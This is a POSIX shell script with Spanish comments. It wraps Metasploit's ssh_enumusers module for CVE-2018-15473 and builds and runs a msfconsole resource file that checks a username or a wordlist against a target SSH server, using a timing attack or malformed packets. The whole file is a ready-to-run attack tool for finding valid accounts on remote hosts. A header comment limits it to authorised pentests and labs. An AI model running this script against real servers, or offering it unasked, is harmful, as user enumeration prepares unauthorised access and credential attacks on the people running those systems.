#!/bin/sh
#
# ssh_enumusers_posix.sh
# Wrapper POSIX (compatible con sh/dash/bash antiguo) para el modulo de Metasploit:
#   auxiliary/scanner/ssh/ssh_enumusers  (CVE-2018-15473)
#
# Uso autorizado unicamente: pentests con permiso explicito o laboratorios propios.
#
# Uso:
#   ./ssh_enumusers_posix.sh -H <host> -w <wordlist> [-p <puerto>] [-t <threads>] [-a <accion>]
#   ./ssh_enumusers_posix.sh -H <host> -u <usuario>  [-p <puerto>] [-a <accion>]
#

PORT=22
THREADS=10
USERNAME=""
WORDLIST=""
HOST=""
ACTION="Timing Attack"

usage() {
    echo "Uso: $0 -H <host> (-w <wordlist> | -u <usuario>) [-p <puerto>] [-t <threads>] [-a <accion>]"
    echo
    echo "  -H  Host/IP objetivo (obligatorio)"
    echo "  -w  Ruta a wordlist de usuarios"
    echo "  -u  Un unico usuario a probar"
    echo "  -p  Puerto SSH (por defecto: 22)"
    echo "  -t  Threads (por defecto: 10)"
    echo "  -a  Accion: 'Timing Attack' (por defecto) o 'Malformed Packet'"
    exit 1
}

while getopts "H:w:u:p:t:a:h" opt; do
    case "$opt" in
        H) HOST="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        u) USERNAME="$OPTARG" ;;
        p) PORT="$OPTARG" ;;
        t) THREADS="$OPTARG" ;;
        a) ACTION="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Validaciones (sintaxis POSIX: [ ] en vez de [[ ]])
if [ -z "$HOST" ]; then
    echo "[!] Falta el host objetivo (-H)."
    usage
fi

if [ -z "$WORDLIST" ] && [ -z "$USERNAME" ]; then
    echo "[!] Debes especificar -w <wordlist> o -u <usuario>."
    usage
fi

if [ -n "$WORDLIST" ] && [ -n "$USERNAME" ]; then
    echo "[!] Usa solo una opcion: -w o -u, no ambas."
    usage
fi

if [ -n "$WORDLIST" ] && [ ! -f "$WORDLIST" ]; then
    echo "[!] No se encuentra el archivo de wordlist: $WORDLIST"
    exit 1
fi

if [ "$ACTION" != "Timing Attack" ] && [ "$ACTION" != "Malformed Packet" ]; then
    echo "[!] Accion invalida: '$ACTION'. Usa 'Timing Attack' o 'Malformed Packet'."
    exit 1
fi

if ! command -v msfconsole >/dev/null 2>&1; then
    echo "[!] msfconsole no esta en el PATH. Instala Metasploit Framework primero."
    exit 1
fi

# Construir el resource script (.rc) para msfconsole
RC_FILE="/tmp/ssh_enumusers_$$.rc"
trap 'rm -f "$RC_FILE"' EXIT INT TERM

{
    echo "use auxiliary/scanner/ssh/ssh_enumusers"
    echo "set RHOSTS $HOST"
    echo "set RPORT $PORT"
    echo "set THREADS $THREADS"
    echo "set ACTION $ACTION"
    if [ -n "$WORDLIST" ]; then
        echo "set USER_FILE $WORDLIST"
    else
        echo "set USERNAME $USERNAME"
    fi
    echo "run"
    echo "exit"
} > "$RC_FILE"

echo "[*] Objetivo: $HOST:$PORT"
echo "[*] Accion: $ACTION"
if [ -n "$WORDLIST" ]; then
    echo "[*] Wordlist: $WORDLIST (threads: $THREADS)"
else
    echo "[*] Usuario unico: $USERNAME"
fi
echo "[*] Lanzando Metasploit..."
echo

msfconsole -q -r "$RC_FILE"
